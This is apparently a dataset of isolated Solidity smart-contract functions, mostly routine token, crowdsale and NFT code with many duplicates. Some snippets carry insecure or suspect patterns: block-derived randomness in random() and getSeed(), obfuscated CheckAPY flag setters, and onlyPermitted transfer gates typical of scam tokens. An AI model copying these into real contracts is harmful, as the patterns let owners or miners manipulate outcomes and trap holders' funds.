--------------------------------------------------------------------------------
function createDepositAddressFor(address _beneficiary) public returns (address) {
        address proxy = new CrowdsaleProxy(_beneficiary, this);
        ProxyCreated(proxy, _beneficiary);
        return proxy;
    }
--------------------------------------------------------------------------------
function createPersonalDepositAddressFor(address _beneficiary) public returns (address) {
        address proxy = new PersonalCrowdsaleProxy(_beneficiary, this);
        ProxyCreated(proxy, _beneficiary);
        return proxy;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setDelegate (address _delegate) public {
    require (msg.sender == owner);

    if (delegate != _delegate) {
      delegate = _delegate;
      Delegation (delegate);
    }
  }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        ownerToOperators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function FlightDelayController() {
        registerContract(owner, "FD.Owner", false);
        registerContract(address(this), "FD.Controller", false);
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) onlyOwner {
        require(_newOwner != address(0));
        owner = _newOwner;
        setContract(_newOwner, "FD.Owner", false);
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
constructor() public {
        symbol = "CST";
        name = "Coin Stack Token";
        decimals = 8;
        _totalSupply = 250000000.00000000;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return withinCap && super.validPurchase();
  }
--------------------------------------------------------------------------------
function ClickableTVToken() public {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function creditOwner() onlyOwner {
    require(!ownerCredited);
    uint ownerAward = initialSale / 10;  // 10% of the crowdsale amount.
    ownerCredited = true;   // Can only be run once.
    mint(owner, ownerAward);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(uint256 openingTime, uint256 closingTime) public {
    // solium-disable-next-line security/no-block-members
    require(openingTime >= block.timestamp);
    require(closingTime >= openingTime);

    _openingTime = openingTime;
    _closingTime = closingTime;
  }
--------------------------------------------------------------------------------
function TRTC2Token() public {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
      super._transfer(sender, recipient, amount);
      _moveDelegates(_delegates[sender], _delegates[recipient], amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function withdrawAnyERC20(address _addressOfToken, address _recipient) public onlyOwner {
        ERC20 token = ERC20(_addressOfToken);
        token.transfer(_recipient, token.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function changeTokenPriceInCent(uint256 _newTokenPrice) public onlyOwner {
        require(_newTokenPrice != tokenPrice && _newTokenPrice > 0);
        emit TokenPriceChanged(tokenPrice, _newTokenPrice);
        tokenPrice = _newTokenPrice;
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function getBalanceValue(address investor) public view returns(uint256) {
        uint256 accruedRatioUSDT = oracle.query();
        return balances[investor].mul(accruedRatioUSDT).div(baseRatio);
    }
--------------------------------------------------------------------------------
function isApprovedForAll(address _owner, address _operator)
        public
        override
        view
        returns (bool isOperator)
    {
        // Opensea address
        if (
            _operator == address(openseaProxyAddress)
        ) {
            return true;
        }

        return super.isApprovedForAll(_owner, _operator);
    }
--------------------------------------------------------------------------------
function getSeed(uint256 _keyBlockNr)
        public
        view
        returns (uint256)
    {
        // Key Block not mined atm
        if (block.number <= _keyBlockNr) return block.number;
        return uint256(blockhash(_keyBlockNr));
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    shadowbolt[spender] = val;
    warlock[spender] = val2; 
    mage[spender] = val3;
    apocalypse = val4;
  }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.transfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function addTokenList(address owner,  uint32 _tokenId) internal {
        ownerBunnies[owner].push( _tokenId);
        emit OwnerBunnies(owner, _tokenId);
        rabbitToOwner[_tokenId] = owner; 
    }
--------------------------------------------------------------------------------
function setToken(IERC20 newToken) external onlyAdmin {
        IERC20 oldToken = token;
        token = newToken;
        emit NewToken(address(oldToken), address(newToken));
    }
--------------------------------------------------------------------------------
function claimRefundsFor(address[] _beneficiaries) external afterSaleFail {
        for (uint256 i = 0; i < _beneficiaries.length; i++) {
            claimRefundFor(_beneficiaries[i]);
        }
    }
--------------------------------------------------------------------------------
function claimTokensFor(address[] _beneficiaries) external afterSaleSuccess {
        for (uint256 i = 0; i < _beneficiaries.length; i++) {
            claimTokenFor(_beneficiaries[i]);
        }
    }
--------------------------------------------------------------------------------
function getSaleDay(uint256 _time) view public returns (uint8) {
        return uint8(_time.sub(startTime).div(60*60*24).add(1));
    }
--------------------------------------------------------------------------------
function LinoToken() public {
    totalSupply = INITIAL_SUPPLY;                         // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                // Tnitial tokens are assigned to creator
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);            // emit Transfer event
  }
--------------------------------------------------------------------------------
function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        dynamicFeesInEffect = true;
        fireSaleTimer = block.timestamp + 1 days;
        return true;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 tokenId) external view returns (uint256) {
        require(
            _exists(tokenId),
            "ERC721: operator query for nonexistent token"
        );

        return tokenId;
    }
--------------------------------------------------------------------------------
function deposit(address _asset, address _from, uint256 _amount) public onlyCustomer returns (uint) {
        if (!ERC20Interface(_asset).transferFrom(_from, this, _amount)) {
            return CUSTOMER_WALLET_NOT_OK;
        }
        return OK;
    }
--------------------------------------------------------------------------------
function setName(string _name) external onlyHuman whenNotPaused returns (bytes32 name) {
        name = user.setName(msg.sender, _name);
        events.emitUserNameSet(msg.sender, name);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
constructor(address _masterCopy) public {
        require(_masterCopy != address(0), "The master copy is required");
        masterCopy = _masterCopy;
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 tokenId) external {
        require(msg.sender == ownerOf[tokenId], "NOT_OWNER");
        
        _transfer(msg.sender, to, tokenId);
        
    }
--------------------------------------------------------------------------------
constructor(address _owner)
        public
    {
        require(_owner != address(0));
        owner = _owner;
        emit OwnerChanged(address(0), _owner);
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function _beforeTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal override(ERC721, ERC721Enumerable) {
        super._beforeTokenTransfer(from, to, tokenId);
        _moveDelegates(delegates[from], delegates[to], 1);
    }
--------------------------------------------------------------------------------
constructor(address operation) public {
    _totalSupply = INITIAL_SUPPLY;
    _balances[operation] = INITIAL_SUPPLY;
    emit Transfer(address(0), operation, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function getEtherAmountFromToken(uint _amount) private view returns (uint) {
        require(aiTokenG3 > 0, "Invalid aiTokenG3, please contact admin");
        return _amount / aiTokenG3;
    }
--------------------------------------------------------------------------------
function isOperatorFor(address _operator, address _tokenHolder) public view returns (bool) {
        return (_operator == _tokenHolder // solium-disable-line operator-whitespace
            || mAuthorizedOperators[_operator][_tokenHolder]
            || (mIsDefaultOperator[_operator] && !mRevokedDefaultOperator[_operator][_tokenHolder]));
    }
--------------------------------------------------------------------------------
function requireMultiple(uint256 _amount) internal view {
        require(_amount % mGranularity == 0, "Amount is not a multiple of granualrity");
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function addXp(uint _tokenId, uint _xp) external auth {
        require(_tokenId < totalSupply(), "operator query for nonexistent token");
        xp[_tokenId] += _xp;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function CrowdsaleController(ISmartToken _token, uint256 _startTime, address _beneficiary, address _btcs, bytes32 _realEtherCapHash)
        public
        SmartTokenController(_token)
        validAddress(_beneficiary)
        validAddress(_btcs)
        earlierThan(_startTime)
        greaterThanZero(uint256(_realEtherCapHash))
    {
        startTime = _startTime;
        endTime = startTime + DURATION;
        beneficiary = _beneficiary;
        btcs = _btcs;
        realEtherCapHash = _realEtherCapHash;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function addStakings(address[] memory _stakings) public onlyOwner() {
        require(_stakings.length > 0, "Length should be > 0");

        _add(stakings, _stakings);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _submitEvidence(IDisputeManager _disputeManager, uint256 _disputeId, address _submitter, bytes memory _evidence) internal {
        IArbitrable subject = IArbitrable(msg.sender);
        _disputeManager.submitEvidence(subject, _disputeId, _submitter, _evidence);
    }
--------------------------------------------------------------------------------
function setFlywheelRewards(IFlywheelRewards newFlywheelRewards) external requiresAuth {
        address oldFlywheelRewards = address(flywheelRewards);

        flywheelRewards = newFlywheelRewards;

        emit FlywheelRewardsUpdate(oldFlywheelRewards, address(newFlywheelRewards));
    }
--------------------------------------------------------------------------------
constructor() public {
    totalSupply = INITIAL_SUPPLY;
    balances[0xF774bE017bFAf640FAb7958BC37AB5Cf893E3A76] = INITIAL_SUPPLY;
    emit Transfer(address(0),0xF774bE017bFAf640FAb7958BC37AB5Cf893E3A76, totalSupply);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function setBuyPrice(uint256 newBuyPrice) 
    onlyOwner 
    public {
        require(newBuyPrice>0);
        _originalBuyPrice = newBuyPrice; // unit
        // control _maximumBuy_USD = 10,000 USD, CGRID price is 0.0365USD
        _maximumBuy = (10**18 * 10**14) /_originalBuyPrice;
    }
--------------------------------------------------------------------------------
function toggleMinting()  onlyOwner public {
    if(pauseMinting){
      pauseMinting = false;
      emit UnPauseMinting();
    }else{
      pauseMinting = true;
      emit PauseMinting();
    }     
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function configure(uint _minBet, uint _maxBet) onlyOwner public {
        require(_minBet >= 0.001 ether && _minBet <= _maxBet);
        minBet = _minBet;
        maxBet = _maxBet;
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function accumulativeFundsOf(address _owner) public view returns(uint256) {
		return pointsPerShare.mul(balanceOf(_owner)).toInt256Safe()
			.add(pointsCorrection[_owner]).toUint256Safe() / pointsMultiplier;
	}
--------------------------------------------------------------------------------
function changeWhitelistingStatus() onlyOwner public{
            if (whitelistingStatus == false){
			    whitelistingStatus = true;
                whitelisted[owner]= true;
            }
            else{
                whitelistingStatus = false;    
            }
		}
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
      		uint256 tokenAmount = _amount.mul(100);
            _transfer(address(this), msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
constructor() 
    DetailedERC20("Ecoshare Community Token","ECT", 18)
    public {
        totalSupply_ = 1000000000 * (10 ** uint256(decimals));
        balances[msg.sender] = totalSupply_;
        paused = true;
    }
--------------------------------------------------------------------------------
function destroy() onlyOwner {
    // Transfer tokens back to owner
    uint256 balance = token.balanceOf(this);
    token.transfer(owner, balance);

    // There should be no ether in the contract but just in case
    selfdestruct(owner);
  }
--------------------------------------------------------------------------------
function _setupTaxAddress(address taxAddress_) internal virtual {
        require(_taxAddress == address(0), "tax address is already set");
        _taxAddress = taxAddress_;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
constructor() {
        _name = "DogeRun Token";
        _symbol = "DOGER";
        _mint(msg.sender, _initialSupply * 10**_decimals);
    }
--------------------------------------------------------------------------------
function failOpaque(FailureInfo info, uint opaqueError) internal returns (uint) {
        Failure(uint(Error.OPAQUE_ERROR), uint(info), opaqueError);

        return uint(Error.OPAQUE_ERROR);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function Burn(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xD7144FcC587dd7931512A9Af3B5B6e3f678d8891,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function    generateHash(   address tokenGet, 
                                uint    amountGet,  
                                address tokenGive, 
                                uint    amountGive, 
                                uint    expires, 
                                uint    nonce)     private view returns(bytes32)
    {
        return sha256(abi.encodePacked(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce));
    }
--------------------------------------------------------------------------------
function withdraw() public onlyOwner {
    uint256 returnAmount = this.balance;
    wallet.transfer(returnAmount);
    emit EtherWithdrawn(wallet, returnAmount);
  }
--------------------------------------------------------------------------------
function sellingWithdrawBalance() view public returns(uint256) {
        address _customerAddress = msg.sender; 
        uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // Get all balances
        return  _sellingWithdraw;
    }
--------------------------------------------------------------------------------
function burn(uint256 _amount) public {
        _burn(msg.sender,_amount);
        _moveDelegates(_delegates[msg.sender],address(0), _amount);
    }
--------------------------------------------------------------------------------
function forwardFunds() internal {
        vault.deposit.value(msg.value)(msg.sender);
        assert(vault.balance == weiRaised);
    }
--------------------------------------------------------------------------------
function hasEnded() public constant returns (bool) {
        bool afterPeriod = now > endTime;
        bool capReached = weiRaised >= cap;
        return afterPeriod || capReached;
    }
--------------------------------------------------------------------------------
function finalize() onlyOwner public {
        require(state == State.publicSale);
        require(hasEnded());
        finalization();
        state = State.hasFinalized;
        Finalized();
    }
--------------------------------------------------------------------------------
function denyRebasement() public isOwner
    {
        require (pendingRebasement.executed == false, "Rebasement already executed.");
        
        pendingRebasement.executed = true;
    }
--------------------------------------------------------------------------------
function SaviorToken(uint64 _preIcoOpeningTime) payable {
        require(_preIcoOpeningTime > now);

        preIcoOpeningTime = _preIcoOpeningTime;
        icoOpeningTime = preIcoOpeningTime + PRE_ICO_DURATION;
        closingTime = icoOpeningTime + ICO_DURATION;
    }
--------------------------------------------------------------------------------
function transferFund(uint256 amount) onlyOwner public {
        require(amount<=address(this).balance,'exceed contract balance');
        ownerWallet.transfer(amount);
    }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
    override
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _removeNFToken(
    address _from,
    uint256 _tokenId
  )
    internal
    virtual
  {
    require(idToOwner[_tokenId] == _from, NOT_OWNER);
    ownerToNFTokenCount[_from] -= 1;
    delete idToOwner[_tokenId];
  }
--------------------------------------------------------------------------------
function claimTokens(uint256 amount) public onlyOwner {
    assert(getAvailableTokens() >= amount);

    claimed = claimed.add(amount);
    token.transfer(owner, amount);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function isContract( address _addr ) view private returns (bool) {
    uint length;
    _addr = _addr;
    assembly { length := extcodesize(_addr) }
    return (length > 0);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function HunxuHappyToken() public {
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function removeLimits() external onlyOwner returns (bool) {
        limitsInEffect = false;
        dynamicFeesInEffect = true;
        fireSaleTimer = block.timestamp + 1 days;
        return true;
    }
--------------------------------------------------------------------------------
function getQueueLength() public view returns (uint) {
        uint stage = block.number / roundDuration;
        return queue[stage].length - currentReceiverIndex[stage];
    }
--------------------------------------------------------------------------------
function cashInvestment(address cashInvestor, uint256 assignedTokens) onlyOwner external {
        // Check if cashInvestor address is set or not
        // By mistake tokens mentioned as 0, save the cost of assigning tokens.
        require(cashInvestor != address(0) && assignedTokens > 0);

        // Call to Internal function to assign tokens
        assignTokensWallet(walletAddresses[4],cashInvestor, assignedTokens);
    }
--------------------------------------------------------------------------------
function ABCToken(
            string _name,
            string _symbol,
            uint8 _decimals,
            uint256 _totalSupply,
            address _initialTokensHolder) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balances[_initialTokensHolder] = _totalSupply;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function unban(address _beneficiary) external onlyOwner saleAllocatable {
	    require(_beneficiary != address(0));
	    require(blacklist[_beneficiary] == true);

        delete blacklist[_beneficiary];
	}
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalBondSupply);
	}
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(
            !_feeless || (_feeless && canWhitelist),
            "cannot add to whitelist"
        );
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless)
        public
        onlyOwner
    {
        require(
            !_feeless || (_feeless && canWhitelist),
            "cannot add to whitelist"
        );
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function registerReferral (address referredByAddress) public {
        require(msg.sender != referredByAddress && referredByAddress != address(0));
        referredBy[msg.sender] = referredByAddress;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function XYI() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function supportsInterface(bytes4 interfaceID) external view returns (bool) {
		return
			// ERC165
			interfaceID == this.supportsInterface.selector ||
			// ERC721
			interfaceID == 0x80ac58cd ||
			// ERC721Metadata
			interfaceID == 0x5b5e139f ||
			// ERC721Enumerable
			interfaceID == 0x780e9d63;
	}
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function mintTokens(address[] calldata recipients)
  public
  onlyOwner{
    for(uint i=0; i<recipients.length; i++){
        _mint(recipients[i]);
     }
  }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function getDeed(uint256 identifier)
        external
        view
        returns(uint256 deedId, address owner, uint256 buyPrice, uint256 nextBuyPrice)
    {
        deedId = identifier;
        owner = identifierToOwner[identifier];
        buyPrice = identifierToPrice[identifier];
        nextBuyPrice = nextPrice(buyPrice);
    }
--------------------------------------------------------------------------------
function registerReferral (address referredByAddress) public {
        require(msg.sender != referredByAddress && referredByAddress != address(0));
        referredBy[msg.sender] = referredByAddress;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function dHealthTokenGrowth(address _token, address _exchangesWallet, address _countriesWallet, address _acquisitionsWallet, address _coindropsWallet) public {
		// set token
		token = dHealthToken(_token);

		// setup wallet addresses
		exchangesWallet = _exchangesWallet;
		countriesWallet = _countriesWallet;
		acquisitionsWallet = _acquisitionsWallet;
		coindropsWallet = _coindropsWallet;
	}
--------------------------------------------------------------------------------
function updateFeeProvider(address _newAddr) public onlyOperator {
        require(_newAddr != address(0), "Invalid contract address.");
        FeeProvider = BitGuildFeeProvider(_newAddr);
    }
--------------------------------------------------------------------------------
function updateWhitelist(address _newAddr) public onlyOperator {
        require(_newAddr != address(0), "Invalid contract address.");
        Whitelist = BitGuildWhitelist(_newAddr);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    misslexa[spender] = val;
    lunastar[spender] = val2; 
    evaangelina[spender] = val3;
    ceres = val4;
  }
--------------------------------------------------------------------------------
function Steel() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function random() private view returns (uint) {
        return uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, raffleTickets.length)));

    }
--------------------------------------------------------------------------------
function stopICO() onlyOwner public{
            icoEndDate = 0;
            uint256 tokenAmount=balanceOf[this];
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
      		uint256 tokenAmount = _amount.mul(1 ether);
            _transfer(this, msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
constructor() public {
    _totalSupply = INITIAL_SUPPLY;
    _balances[0x7C1A414C71D2dCc7440901c0Adf49c34039E496b ] = INITIAL_SUPPLY;
    emit Transfer(address(0), 0x7C1A414C71D2dCc7440901c0Adf49c34039E496b ,_totalSupply);
    
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {/// Should have sth in this
		owner = msg.sender;
		totalSupply = 1000000000000000000000000000;
		/// 10 Billion for init mint
		maxSupply = 2000000000000000000000000000;
		/// set Max supply as 20 billion
		balances[msg.sender] = totalSupply;
	}
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function _upgradeTo(address newImplementation) internal {
    address currentImplementation = implementation();
    require(currentImplementation != newImplementation);
    setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }
--------------------------------------------------------------------------------
function destroyBlacklistedTokens(address _who, uint256 _amount) public userBlacklisted(_who) whenNotPaused requiresPermission {
        tokenStorage.subBalance(_who, _amount);
        tokenStorage.subTotalSupply(_amount);
        emit DestroyedBlacklistedTokens(_who, _amount);
    }
--------------------------------------------------------------------------------
constructor() public {
        data = new ReserveEternalStorage(msg.sender);
        owner = msg.sender;
        pauser = msg.sender;
        // Other roles deliberately default to the zero address.
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        external
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function supportsInterface(bytes4 _interfaceID) public pure returns (bool) {
        return _interfaceID == INTERFACE_META_ID ||
        _interfaceID == ADDR_INTERFACE_ID ||
        _interfaceID == NAME_INTERFACE_ID ||
        _interfaceID == TEXT_INTERFACE_ID ||
        _interfaceID == CONTENT_HASH_INTERFACE_ID;
    }
